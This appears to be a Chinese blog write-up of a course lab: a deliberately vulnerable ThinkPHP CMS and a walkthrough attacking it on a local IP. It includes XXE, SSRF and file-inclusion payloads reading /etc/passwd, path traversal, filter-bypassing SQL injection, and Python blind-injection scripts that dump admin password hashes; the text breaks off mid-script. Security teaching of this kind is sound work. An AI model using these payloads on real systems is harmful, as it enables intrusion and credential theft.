      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/init:/docker-entrypoint-initdb.d/</span>
      <span class="hljs-comment"># 这里需要初始化一个数据库</span>
    <span class="hljs-attr">ports:</span> 
      <span class="hljs-bullet">-</span> <span class="hljs-number">3306</span><span class="hljs-string">:3306</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_ROOT_PASSWORD=root</span>
     <span class="hljs-comment"># mysql数据库的密码</span>
</code></pre>

<p>其余配置文件可以根据需要从网上获取。</p>
<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>搭建目的是测试使用，方便重新搭建和数据管理，为再linux上搭建做好准备</p>
<p>课程要求使用docker搭建运行环境，但是Linux系统是虚拟机搭建的，里面没有好用的phpStrom，所以先在windows上搭建，试试水。</p>
<p>工具使用phpstduy2018，apache+php7.1</p>
<ul>
<li><p>首先在数据库中建立一个数据库，复制cms.sql中的内容在命令行中运行</p>
</li>
<li><p>将文件放入www目录下，修改config中的database.php内容，将用户名和密码该对应的内容</p>
</li>
<li><p>打开phpstduy,选择 其他菜单选项-&gt;站点域名管理，网站目录选择cms/public，网站名随便起，如<a href="http://www.mycms.com">www.mycms.com</a></p>
</li>
<li><p>打开host文件，添加 <code>127.0.0.1  www.mycms.com</code>，然后访问即可<a href="http://www.mycms.com/admin进入后台">www.mycms.com/admin进入后台</a></p>
<p>账号密码都为admin</p>
</li>
</ul>
  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210321160739254.png" style="zoom:50%;">





<h2 id="3-开发过程"><a href="#3-开发过程" class="headerlink" title="3.开发过程"></a>3.开发过程</h2><p>开发thinkphp的网站，当然离不开ThinkPHP的手册<code>http://www.shouce.ren/api/view/a/15517</code></p>
<p>thinkphp中是基于<code>模块\控制器\方法</code>来访问网页的，所以我们必须学会如何创建一个控制器</p>
<p>在网站的文件下，调出终端使用</p>
<pre><code class="hljs gauss">php think <span class="hljs-built_in">make</span>:controller  模块名\控制器名</code></pre>

<p>创建完后便可以在浏览器中输入<code>127.0.0.1\模块名\控制器名</code>，进行访问，当然还要继续完善其中的内容</p>
<p>以上是开发最基础的部分，也是最重要的部分，所有的漏洞代码基本都需要在自己所创建的控制器中完成的。</p>
<h2 id="4-网站介绍"><a href="#4-网站介绍" class="headerlink" title="4.网站介绍"></a>4.网站介绍</h2><p>此站点采用的是基于thinkPHP的cms，此cms包含常用于一些公司主页介绍或者个人博客的搭建，是一个功能相对比较齐全的cms，但是随着功能的增多也会暴露出一些问题，所以会存在一些漏洞，加上自己根据课程要求对其进行了魔改，使得该系统包含了十二种漏洞，二十个漏洞点。</p>
<p>该网站是一家安全公司的主页，但是由于该安全公司刚刚成立不久，网站开发人员安全意识不够高（haha, 纯属虚构），导致该网站中存在了很多漏洞，此时一个不安好心的黑客看上了这家安全公司的网站。对该网站进行了攻击。</p>
<p>具体功能如下：</p>
<p>(1).前台展示页面，包含关于我们，新闻中心，联系我们以及意见反馈四个模块</p>
<p>其中关于我们–&gt;公司主页 位置存在SSRF漏洞</p>
<p>意见反馈 存在XXE漏洞</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181531579.png" alt="image-20210408181531579"></p>
<p>(2).后台管理员页面，后台管理功能十分丰富，几乎包含所有需要的功能，并且可以根据需要自定义模块并安装，其中的短消息发送存在XSS漏洞，查看内网主机和phpinfo存在远程命令执行漏洞，管理会员的页面存在CSRF漏洞</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181705018.png" alt="image-20210408181705018"></p>
<p>(3).用户注册与登录，提供用户注册和登录功能，登录后的用户可以根据权限向不同的栏目投稿，向别的用户发送消息，支持头像更换，密码修改等功能。其中投稿位置存在XSS漏洞和文件上传漏洞，密码修改位置存在SQL注入漏洞。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421223320698.png" alt="image-20210421223320698"></p>
<p>(4).在前台页面中有一个单独的模块，叫免试加入，这里存在一个CTF题目，类型时unserialize，如果可以获取flag，则可以获取免试资格加入团队。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181601058.png" alt="image-20210408181601058" style="zoom:67%;">

<h2 id="5-漏洞介绍"><a href="#5-漏洞介绍" class="headerlink" title="5.漏洞介绍"></a>5.漏洞介绍</h2><ul>
<li><p>本地文件包含</p>
<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞，造成这个漏洞的函数有四个<code>include,include_once,require,require_once</code>。该漏洞可以使用php为协议php://filter，读取php文件的源码，在一些ctf题目中很常见。</p>
<p>该漏洞存在于网站首页的联系我们页面</p>
</li>
<li><p>ssrf</p>
<p>服务器端请求伪造是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，攻击者可以利用该漏洞对内网进行扫描探测存活的主机和端口，进而对内网进行攻击。此外该漏洞还会造成文件包含，使用file://协议+文件绝对路径可以获取服务器上的文件。</p>
<p>总结SSRF造成的危害：</p>
<ul>
<li><p>扫内网</p>
</li>
<li><p>向内部任意主机的任意端口发送精心构造的Payload</p>
</li>
<li><p>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</p>
</li>
<li><p>攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等）</p>
</li>
<li><p>利用file协议读取本地文件等</p>
</li>
</ul>
<p>此漏洞存在访问公司主页</p>
</li>
</ul>
<ul>
<li><p>xxe</p>
<p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是XML外部实体。</p>
<p>此漏洞可以形成命令执行和文件包含攻击。</p>
<p>此漏洞存在于意见反馈页面</p>
</li>
</ul>
<ul>
<li><p>sql注入 — 包含两个漏洞点</p>
<p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p>
<p>此漏洞存在与用户修改密码页面和登录修改稿件页面，二者都可以使用盲注进行攻击。</p>
</li>
</ul>
<ul>
<li><p>文件上传</p>
<p>网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。</p>
<p>此漏洞存在于用户上传头像的位置，上传一句话木马后可直接使用蚁剑获取shell</p>
</li>
</ul>
<ul>
<li><p>弱口令</p>
<p>弱口令顾名思义是使用了安全性比较低，并且比较常见的短字符作为密码</p>
<p>此漏洞存在于管理员密码，这是很常见但又很危险的一个漏洞</p>
</li>
</ul>
<ul>
<li><p>xss       — 包含两个漏洞点</p>
<p>xss就是攻击者在web页面插入恶意的Script代码，当用户浏览该页之时，嵌入其中web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。攻击这可以使用xss获取处于登录状态的用户cookie，从而可以无密码登录账号。</p>
<p>此漏洞存在两个地方，一个是用户投稿，一个用户发送短消息</p>
</li>
</ul>
<ul>
<li><p>rce</p>
<p>是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p>
<p>此漏洞存在于后台管理页面中的信息采集–&gt;查看内网主机</p>
</li>
<li><p>任意文件下载</p>
<p>非法下载服务器上存在的资源</p>
</li>
<li><p>csrf</p>
<p>跨站点请求伪造 ， 跟XSS攻击一样，存在巨大的危害性 。利用csrf，攻击者可以盗用你的身份，以你的名义发送恶意请求。 你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210321220650619.png" alt="image-20210321220650619" style="zoom:50%;">



</li>
</ul>
<ul>
<li><p>反序列化  </p>
<p>不安全的反序列化是指网站对用户可控制的数据进行反序列化时，攻击者能够操纵序列化的对象，以将有害数据传递到应用程序代码中。甚至有可能用完全不同类的对象替换序列化的对象。更夸张的是，将对网站可用的任何类别的对象进行反序列化和实例化，而与预期的类别无关。因此，不安全的反序列化有时称为“对象注入”漏洞</p>
<p>此漏洞存在免试加入我们的页面，成功者可以获得一个flag。</p>
</li>
</ul>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>渗透测试流程</p>
<p><img src="/2021/03/21/mycms/Users/Sunzh/Desktop/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%AE%9E%E8%B7%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.png" alt="网络攻击与防御实践渗透测试流程"></p>
<h2 id="1-RFI"><a href="#1-RFI" class="headerlink" title="1.RFI"></a>1.RFI</h2><p>首先点击首页的最下面“优秀员工”，可以发现URL的变化，看到最后有一个file参数，猜测该页面的一些参数是从<code>info.php</code>中获取的，那么这个位置就应该是一个本地文件包含。尝试将info.php换成其他的文件名，发现页面中的一些内容消失了，说明这里就是用了文件包含。</p>
<p>那么如果没有对该参数进行过滤或者其他的限制的话，我们就可以使用<code>php://filter</code>协议读取到php文件的base64源码，</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210401101403284.png" alt="image-20210401101403284"></p>
<p>或者直接读取操作系统中的一些敏感文件，如<code>/etc/passwd</code>。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210401101335296.png" alt="image-20210401101335296"></p>
<p>可以看到，这里没有对file协议过滤，这样就可以通过一些常用的文件路径获取到敏感文件</p>
<h2 id="2-XXE"><a href="#2-XXE" class="headerlink" title="2.XXE"></a>2.XXE</h2><p>注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p>
<p>xxe漏洞存在于意见反馈页面，使用Bp抓包可以看到，提交的参数是xml格式，提交成功后会返回一个提示信息<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322094353064.png" alt="image-20210322094353064"></p>
<p>既然参数是以xml格式提交的，那么我们可以尝试构造出一个外部实体注入其中，造成文件包含或者命令执行。</p>
<p>使用payload读取<code>/etc/passwd</code>文件</p>
<pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
]&gt;
&lt;user&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;info&gt;as&lt;&#x2F;info&gt;&lt;&#x2F;user&gt;</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322095014823.png" alt="image-20210322095014823"></p>
<h2 id="3-SSRF"><a href="#3-SSRF" class="headerlink" title="3.SSRF"></a>3.SSRF</h2><p>当访问公司主页这个页面时会发现url发生变化，并跳转到另一页面</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192059989.png" alt="image-20210322192059989" style="zoom:50%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192116225.png" alt="image-20210322192116225" style="zoom:67%;">

<p>这里是跳转到了我的博客页面，但是可能由于缺少渲染，显示不正常，尝试访问百度，get提交</p>
<pre><code class="hljs awk">?url=https:<span class="hljs-regexp">//</span>www.baidu.com</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192303582.png" alt="image-20210322192303582"></p>
<p>可以发现成功跳转到了百度的页面，猜测我们提交的url参数没有进行过滤就直接带入到函数中执行。</p>
<p>那么我们可以尝试使用<code>file://</code>协议读取服务器上的文件，使用payload:<code>?url=file:///etc/passwd</code>，成功读取到文件内容，漏洞利用成功。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192737122.png" alt="image-20210322192737122"></p>
<h2 id="4-目录遍历"><a href="#4-目录遍历" class="headerlink" title="4.目录遍历"></a>4.目录遍历</h2><p>在浏览器中按F12，在network中查看响应头，可以发现存在server字段，这是网站使用的服务器以及版本信息，这里可以看到是nginx</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414192735246.png" alt="image-20210414192735246" style="zoom:50%;">

<p>而nginx存在一个很常见的漏洞—配置不当导致的目录穿越漏洞</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414193433871.png" alt="image-20210414193433871" style="zoom:67%;">



<p>进行攻击</p>
<p>尝试访问<code>http://192.168.164.147/files/</code>，出现了<code>images</code>文件夹，这应该网站保存上传图片的位置</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414193646247.png" alt="image-20210414193646247"></p>
<p>输入<code>http://192.168.164.147/files../</code>看到了网站的根目录中的内容，点击可以将部分文件下载。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414194304371.png" alt="image-20210414194304371" style="zoom: 50%;">

<h2 id="5-SQL注入（4个）"><a href="#5-SQL注入（4个）" class="headerlink" title="5.SQL注入（4个）"></a>5.SQL注入（4个）</h2><h3 id="漏洞点一"><a href="#漏洞点一" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>第一个sql注入漏洞点在用户登录页面，存在一个修改密码功能，先注册有一个用户，尝试修改密码，猜测其工作机制。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193046802.png" alt="image-20210322193046802" style="zoom:67%;">

<p>第一次尝试输入一个不存在的用户名，返回信息是<code>no user!</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193527184.png" alt="image-20210322193527184"></p>
<p>第二次输入正确的用户名错误的密码，提示<code>wrong password!</code>，这个逻辑很正常</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193635551.png" alt="image-20210322193635551"></p>
<p>第三次输入正确的用户名和密码，而两个不一样的新密码，提示<code>new password are different!</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193733391.png" alt="image-20210322193733391"></p>
<p>这上面的三种情况是修改密码时常见的情况，看似都可以正常的工作，但是如果没有对用户名这个参数进行严格的过滤的话就可以造成盲注的漏洞。</p>
<p>因为当我们提交完参数后，服务器要做的第一件事就是去数据库种查找是否存在该用户名，若不存在则返回<code>no user!</code>，若存在的话且输入的两次新密码都正确但是旧密码错误，就会提示用户<code>wrong password!</code>，这也是造成盲注的重要原因。比如说，我们注册的用户名和密码分别为<code>szy</code>和<code>admin</code>，但是我们提交时构造出如下的语句</p>
<pre><code class="hljs apache"><span class="hljs-attribute">account</span>=szy&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span>
<span class="hljs-attribute">account</span>=szy&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span>#&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194605601.png" alt="image-20210322194605601"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194635676.png" alt="image-20210322194635676"></p>
<p>看到以上的结果我们就可以判断一定存在注入。</p>
<p>构造payload</p>
<pre><code class="hljs apache"><span class="hljs-attribute">account</span>=szy&#x27; and ascii(substring(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span> #&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194849731.png" alt="image-20210322194849731"></p>
<p>返回的是<code>wrong password</code>，说明数据库名的第一个字符的ascii码是大于100的，直接使用二分注入，脚本如下</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
url = <span class="hljs-string">&quot;http://192.168.164.147:81/change/changepass&quot;</span>

heard = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;http://192.168.164.147:81/change/changepass&quot;</span>&#125;
flag = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># time.sleep(1)</span>
        payload = <span class="hljs-string">&quot;szy&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125; #&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        data = &#123;<span class="hljs-string">&quot;account&quot;</span>:payload, <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;111a&quot;</span>,<span class="hljs-string">&quot;npassword&quot;</span>:<span class="hljs-string">&quot;222&quot;</span>,<span class="hljs-string">&quot;newpassword&quot;</span>:<span class="hljs-string">&quot;222&quot;</span>&#125;
        response = requests.post(url=url,data=data,headers=heard)
        <span class="hljs-comment"># t = response.text</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;wrong password&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)
​```
database:yzncms
table:yzn_admin
columns:<span class="hljs-built_in">id</span>,username,password,roleid,encrypt
​```</code></pre>

<p>yzn_admin的列名，省略了后面的列</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322200732911.png" alt="image-20210322200732911"></p>
<p>获取管理员的用户名和密码</p>
<pre><code class="hljs apache"><span class="hljs-attribute">username</span>:admin
<span class="hljs-attribute">password</span>:<span class="hljs-number">9724</span>b<span class="hljs-number">5</span>e<span class="hljs-number">6</span>c<span class="hljs-number">56</span>b<span class="hljs-number">95</span>f<span class="hljs-number">5723009</span>ef<span class="hljs-number">81961</span>bfe</code></pre>

<p>这个密码是32位的，可能是md5处理后保存的，暂时无法破解。</p>
<h3 id="漏洞点二"><a href="#漏洞点二" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>用户登录后，存在一个查找用户邮箱的功能，这里可能存在注入。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181146985.png" alt="image-20210421181146985" style="zoom:67%;">

<p>这里已经提示了存在了过滤，那么就看看过滤那些东西</p>
<p>输入一个存在的用户名，查找结果如图</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181314404.png" alt="image-20210421181314404" style="zoom:50%;">

<p>输入一个不存在的用户</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181345626.png" alt="image-20210421181345626" style="zoom:33%;">

<p>尝试输入</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sunzy</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #</code></pre>

<p>网页报错，并将错误信息显示，可以看到输入的or,空格都被换成了空格，这还是很容易绕过的</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181603698.png" alt="image-20210421181603698" style="zoom:50%;">

<p>fuzz测试后，发现过滤<code>union,空格,or,and,select,from</code>，可以使用双写绕过，空格的可以使用<code>/**/</code>替换</p>
<p>经过测试，发现返回结果只有一列</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421182546039.png" alt="image-20210421182546039" style="zoom: 50%;">

<p>直接进行sql注入</p>
<ul>
<li><p>获取数据库中的表名</p>
<pre><code class="hljs gauss">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-built_in">group_concat</span>(table_name)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>infoorrmation_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-built_in">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421183121965.png" alt="image-20210421183121965" style="zoom:50%;">
</li>
<li><p>获取字段名</p>
<pre><code class="hljs reasonml">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">column_name</span>)</span><span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>infoorrmation_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&quot;yzn_member&quot;</span>#</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421183924790.png" alt="image-20210421183924790" style="zoom:50%;">
</li>
<li><p>获取字段值</p>
<pre><code class="hljs reasonml">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">passwoorrd</span>)</span><span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>yzn_member#</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421184126966.png" alt="image-20210421184126966" style="zoom:67%;">

</li>
</ul>
<h3 id="漏洞点三"><a href="#漏洞点三" class="headerlink" title="漏洞点三"></a>漏洞点三</h3><p>用户主页-&gt;积分赠送，通过测试可以发现也是存在sql注入的</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423172440793.png" alt="image-20210423172440793" style="zoom:50%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423173007408.png" alt="image-20210423173007408" style="zoom:50%;">

<p>因为没有回显，需要使用盲注</p>
<p>盲注脚本与上面的类似，稍加修改即可。</p>
<h3 id="漏洞点四"><a href="#漏洞点四" class="headerlink" title="漏洞点四"></a>漏洞点四</h3><p>注册后登录，发现其中存在一个投稿的功能，投稿后需要管理员审核，在此期间我们可以再次编辑我们的稿件</p>
<p>当点击编辑后，发现url上多了一个id参数，这应该是我们稿件的id，方便查询。但是通常这种参数如果过滤不严格的话也会存在SQL注入，而这个位置显然输入数字型注入。</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">164.147</span>:<span class="hljs-number">81</span><span class="hljs-regexp">/member/</span>content/edit.html?id=<span class="hljs-number">3</span></code></pre>

<p>探测是否 存在注入，当输入<code>?id=3 and 1=1 #</code>时页面返回正常，但是当输入<code>?id=3 and 1=2#</code>,却提示了稿件不存在，说明这里也是存在注入的，但是没有回显，无法获取返回的内容只能采用盲注的方法。</p>
<p>==在测试的过程种发现这个位置使用 <code>&gt;</code>时会出现错误提示，而<code>&lt;</code>不起作用，只能使用<code>=</code>，所以无法使用二分注入，但是直接暴力破解也很快==</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/3/20 9:03</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : cms_sql2.py</span>

<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
url = <span class="hljs-string">&quot;http://192.168.164.147:81/member/content/edit.html?id=&quot;</span>
header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;thinkphp_show_page_trace=0|0; PHPSESSID=d2b4f4b001d70e670953a36d00ca8be6; thinkphp_show_page_trace=0|0&quot;</span>&#125;
flag = <span class="hljs-string">&quot;&quot;</span>
words = [<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>,<span class="hljs-string">&quot;g&quot;</span>,<span class="hljs-string">&quot;h&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;j&quot;</span>,<span class="hljs-string">&quot;k&quot;</span>,<span class="hljs-string">&quot;l&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>,<span class="hljs-string">&quot;o&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;v&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>,<span class="hljs-string">&quot;C&quot;</span>,<span class="hljs-string">&quot;D&quot;</span>,<span class="hljs-string">&quot;E&quot;</span>,<span class="hljs-string">&quot;F&quot;</span>,<span class="hljs-string">&quot;G&quot;</span>,<span class="hljs-string">&quot;H&quot;</span>,<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-string">&quot;J&quot;</span>,<span class="hljs-string">&quot;K&quot;</span>,<span class="hljs-string">&quot;L&quot;</span>,<span class="hljs-string">&quot;M&quot;</span>,<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-string">&quot;O&quot;</span>,<span class="hljs-string">&quot;P&quot;</span>,<span class="hljs-string">&quot;Q&quot;</span>,<span class="hljs-string">&quot;R&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>,<span class="hljs-string">&quot;T&quot;</span>,<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-string">&quot;V&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>,<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;Y&quot;</span>,<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;5&quot;</span>,<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;9&quot;</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>():</span>
    flag = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
        <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:
            <span class="hljs-comment"># payload = &quot;3 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a = &#123;1&#125;)#&quot;.format(i,ord(word))</span>
            payload = <span class="hljs-string">&quot;3 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a=&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(word))
            payload = <span class="hljs-string">&quot;3 and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a=&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(word))
            url1 = url+payload

            res = requests.get(url1,headers=header)
